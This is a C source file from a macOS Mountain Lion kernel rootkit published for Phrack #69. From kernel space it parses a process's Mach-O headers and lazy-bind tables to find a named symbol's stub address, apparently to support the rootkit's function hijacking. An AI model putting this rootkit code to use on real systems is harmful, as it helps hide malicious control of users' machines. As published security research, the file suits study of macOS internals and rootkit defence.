/*
 *   _____   _                          ___     _      _  _     _              __ _
 *  |_   _| | |_      ___      o O O   | __|   | |    | || |   (_)    _ _     / _` |
 *    | |   | ' \    / -_)    o        | _|    | |     \_, |   | |   | ' \    \__, |
 *   _|_|_  |_||_|   \___|   TS__[O]  _|_|_   _|_|_   _|__/   _|_|_  |_||_|   |___/
 * _|"""""|_|"""""|_|"""""| {======|_| """ |_|"""""|_| """"|_|"""""|_|"""""|_|"""""|
 * "`-0-0-'"`-0-0-'"`-0-0-'./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *            ___      _
 *    o O O  / __|    (_)      _ _    __     _  _     ___
 *   o      | (__     | |     | '_|  / _|   | +| |   (_-<
 *  TS__[O]  \___|   _|_|_   _|_|_   \__|_   \_,_|   /__/_
 *  {======|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|
 * ./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *
 * And now for something completely different...
 *
 * A Mountain Lion rootkit for Phrack #69!
 *
 * Copyright (c) fG!, 2012, 2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * macho_utils.c
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include "macho_utils.h"

#include <sys/param.h>
#include <sys/malloc.h>
#include <sys/dirent.h>
#include <mach-o/loader.h>
#include <stdint.h>

#include "kernel_info.h"
#include "cpu_protections.h"
#include "configuration.h"
#include "hijacking_utils.h"
#include "function_pointers.h"
#include "proc_utils.h"

uint64_t
read_uleb128(const uint8_t**p, const uint8_t* end)
{
    uint64_t result = 0;
    int bit = 0;
    
    do {
        if (*p == end)
        {
#if DEBUG
            //moony_modify//printf("[ERROR] malformed uleb128");
#endif
            return 0;
        }
        uint64_t slice = **p & 0x7f;
        
        if (bit >= 64 || slice << bit >> bit != slice)
        {
#if DEBUG
            //moony_modify//printf("[ERROR] uleb128 too big");
#endif
            return 0;
        }
        else
        {
            result |= (slice << bit);
            bit += 7;
        }
    } while (*(*p)++ & 0x80);
    return result;
}

int64_t
read_sleb128(const uint8_t** p, const uint8_t* end)
{
    int64_t result = 0;
    int bit = 0;
    uint8_t byte;
    do {
        if (*p == end)
        {
#if DEBUG
            //moony_modify//printf("[ERROR] malformed sleb128");
#endif
            return 0;
        }
        
        byte = *(*p)++;
        result |= ((byte & 0x7f) << bit);
        bit += 7;
    } while (byte & 0x80);
    // sign extend negative numbers
    if ( (byte & 0x40) != 0 ) result |= (-1LL) << bit;
    return result;
}

/*
 * return the symbol stub address
 * assumes there is a LC_DYLD_INFO_ONLY available!
 * XXX: not 100% stable
 */
mach_vm_address_t
find_stub_address(char *proc_name, char *symbol_name)
{
    proc_t proc = find_proc_by_name(proc_name);
    mach_vm_address_t linkedit_address = 0;
    uint64_t linkedit_offset = 0;
    uint32_t lazybind_offset = 0;
    uint32_t lazybind_size = 0;
    mach_vm_address_t data_addr = 0;
    mach_vm_address_t stub_addr = 0;
    uint32_t stub_nr = 0;
    uint32_t stub_size = 0;
    int dyld_info_exists = 0;
    //
    mach_vm_address_t symbol_address = 0;

    if (proc != (proc_t)0)
    {
        struct task *task = (struct task*)proc->task;
        mach_vm_address_t base_address = 0;
        if (task != NULL)
        {
            mach_vm_address_t memory_address = task->map->hdr.links.start;
            struct mach_header *mh = (struct mach_header*)memory_address;
            int header_size = 0;
            if (mh->magic == MH_MAGIC)
            {
                header_size = sizeof(struct mach_header);
            }
            else if (mh->magic == MH_MAGIC_64)
            {
                header_size = sizeof(struct mach_header_64);
            }
            else
            {
                return 0;
            }
            
            // retrieve a bunch of information we need from the header
            char *loadcmd_addr = (char*)mh + header_size;
            for (int i = 0; i < mh->ncmds; i++)
            {
                struct load_command *load_cmd = (struct load_command*)loadcmd_addr;
                if (load_cmd->cmd == LC_SEGMENT)
                {
                    struct segment_command *seg_cmd = (struct segment_command*)load_cmd;
                    struct section *section_cmd = NULL;
                    char *section_addr = NULL;

                    if (strncmp(seg_cmd->segname, "__TEXT", 16) == 0)
                    {
                        base_address = seg_cmd->vmaddr;
                        section_addr = (char*)seg_cmd + sizeof(struct segment_command);
                        for (int x = 0; x < seg_cmd->nsects; x++)
                        {
                            section_cmd = (struct section*)section_addr;
                            if ((section_cmd->flags & SECTION_TYPE) == S_SYMBOL_STUBS)
                            {
                                stub_addr = section_cmd->addr;
                                stub_size = section_cmd->reserved2;
                                stub_nr   = (uint32_t)(section_cmd->size / stub_size);
                            }
                            section_addr += sizeof(struct section);
                        }

                    }
                    else if (strncmp(seg_cmd->segname, "__DATA", 16) == 0)
                    {
                        data_addr = seg_cmd->vmaddr;
                    }
                    else if (strncmp(seg_cmd->segname, "__LINKEDIT", 16) == 0)
                    {
                        linkedit_address = seg_cmd->vmaddr;
                        linkedit_offset  = seg_cmd->fileoff;
                    }

                }
                else if (load_cmd->cmd == LC_SEGMENT_64)
                {
                    struct segment_command_64 *seg_cmd = (struct segment_command_64*)load_cmd;
                    struct section_64 *section_cmd = NULL;
                    char *section_addr = NULL;
                    if (strncmp(seg_cmd->segname, "__TEXT", 16) == 0)
                    {
                        base_address = seg_cmd->vmaddr;
                        section_addr = (char*)seg_cmd + sizeof(struct segment_command_64);
                        for (int x = 0; x < seg_cmd->nsects; x++)
                        {
                            section_cmd = (struct section_64*)section_addr;
                            if ((section_cmd->flags & SECTION_TYPE) == S_SYMBOL_STUBS)
                            {
                                stub_addr = section_cmd->addr;
                                stub_size = section_cmd->reserved2;
                                stub_nr   = (uint32_t)(section_cmd->size / stub_size);
                            }
                            section_addr += sizeof(struct section_64);
                        }
                    }
                    else if (strncmp(seg_cmd->segname, "__DATA", 16) == 0)
                    {
                        data_addr = seg_cmd->vmaddr;
                    }
                    else if (strncmp(seg_cmd->segname, "__LINKEDIT", 16) == 0)
                    {
                        linkedit_address = seg_cmd->vmaddr;
                        linkedit_offset  = seg_cmd->fileoff;
                    }
                }
                else if (load_cmd->cmd == LC_DYLD_INFO_ONLY)
                {
                    struct dyld_info_command *dylibInfoCmd = (struct dyld_info_command*)loadcmd_addr;
                    lazybind_offset = dylibInfoCmd->lazy_bind_off;
                    lazybind_size   = dylibInfoCmd->lazy_bind_size;
                    dyld_info_exists++;
                }
                loadcmd_addr += load_cmd->cmdsize;
            }
            // add aslr slide to the values
            intptr_t aslr_slide = memory_address - base_address;
            linkedit_address += aslr_slide;
            data_addr += aslr_slide;
            stub_addr += aslr_slide;
            // process LC_DYLD_INFO_ONLY
            if (dyld_info_exists)
            {
                // the location of the compressed table info
                const uint8_t *start = (uint8_t*)(linkedit_address + (lazybind_offset - linkedit_offset));
                const uint8_t *end   = (uint8_t*)(start + lazybind_size);
                uint8_t type = BIND_TYPE_POINTER;
                uint8_t segIndex = 0;
                uint64_t segStartAddr = 0;
                uint64_t segOffset = 0;
                uint64_t libraryOrdinal = 0;
                const char* symbolName = NULL;
                for (const uint8_t *p = start; p < end; )
                {
                    uint8_t immediate = *p & BIND_IMMEDIATE_MASK;
                    uint8_t opcode    = *p & BIND_OPCODE_MASK;
                    ++p;
                    switch (opcode) {
                        case BIND_OPCODE_DONE:
                            break;
                            // Set the library ordinal of the current symbol to the imm operand
                        case BIND_OPCODE_SET_DYLIB_ORDINAL_IMM:
                            libraryOrdinal = immediate;
                            break;
                            // Same as above, but the library ordinary is read from the unsigned LEB128-encoded extra data.
                        case BIND_OPCODE_SET_DYLIB_ORDINAL_ULEB:
                            libraryOrdinal = read_uleb128(&p, end);
                            break;
                            // Same as above, but the ordinary as set as negative of imm.
                        case BIND_OPCODE_SET_DYLIB_SPECIAL_IMM:
                            // the special ordinals are negative numbers
                            if ( immediate == 0 ) libraryOrdinal = 0;
                            else
                            {
                                int8_t signExtended = BIND_OPCODE_MASK | immediate;
                                libraryOrdinal = signExtended;
                            }
                            break;
                            // Set flags of the symbol in imm, and the symbol name as a C string in the extra data.
                        case BIND_OPCODE_SET_SYMBOL_TRAILING_FLAGS_IMM:
                            symbolName = (char*)p;
                            // advance pointer to the end of the string
                            while (*p != '\0') ++p;
                            ++p;
                            break;
                            // Set the type of symbol as imm. Known values are:
                            // 1 = POINTER
                            // 2 = TEXT_ABSOLUTE32
                            // 3 = TEXT_PCREL32
                        case BIND_OPCODE_SET_TYPE_IMM:
                            type = immediate;
                            break;
                            // Set the addend of the symbol as the signed LEB128-encoded extra data. Usage unknown.
                        case BIND_OPCODE_SET_ADDEND_SLEB:
                            //                addend = read_sleb128(p, end);
                            break;
                            // Set that the symbol can be found in the imm-th segment, at an offset found in the extra data.
                        case BIND_OPCODE_SET_SEGMENT_AND_OFFSET_ULEB:
                            segIndex = immediate;
                            // the address comes from __DATA segment
                            // FIXME: we are assuming the segment is __DATA
                            segStartAddr = data_addr;
                            segOffset = read_uleb128(&p, end);
                            break;
                            // Increase the offset (as above) by the LEB128-encoded extra data.
                        case BIND_OPCODE_ADD_ADDR_ULEB:
                            segOffset += read_uleb128(&p, end);
                            break;
                            // Define a symbol from the gathered information. Increase the offset by 4 (or 8 on 64-bit targets) after this operation.
                        case BIND_OPCODE_DO_BIND:
                        {
                            // add the symbol to our hash table
                            if (symbolName != NULL && strcmp(symbolName, symbol_name) == 0)
                            {
#if DEBUG
                                //moony_modify//printf("[DEBUG] Symbol stub %s at %llx\n", symbolName, segStartAddr+segOffset);
#endif
                                symbol_address = segStartAddr + segOffset; // the address where the pointer to symbol is located
                                // advance
                                segOffset += sizeof(size_t); // 4 bytes for 32bits targets, 8 for 64
                            }
                            break;
                        }
                    }
                }
                
                if (symbol_address != 0)
                {
                    for (uint32_t i = 0; i < stub_nr; i++)
                    {
                        mach_vm_address_t breakpoint_address = stub_addr + i * stub_size;
                        // note: be careful that RIP addressing is signed!
                        mach_vm_address_t pointer_address = *(int32_t*)(breakpoint_address+2) + breakpoint_address + stub_size; // RIP addressing
                        // the connection is made via the pointer address
                        if (symbol_address == pointer_address)
                        {
#if DEBUG
                            //moony_modify//printf("[DEBUG] found symbol stub %s at address %p %p\n", symbol_name, (void*)pointer_address, (void*)breakpoint_address);
#endif
                            return breakpoint_address;
                        }
                    }
                    
                }
            }
        }
    }
    return 0;
}
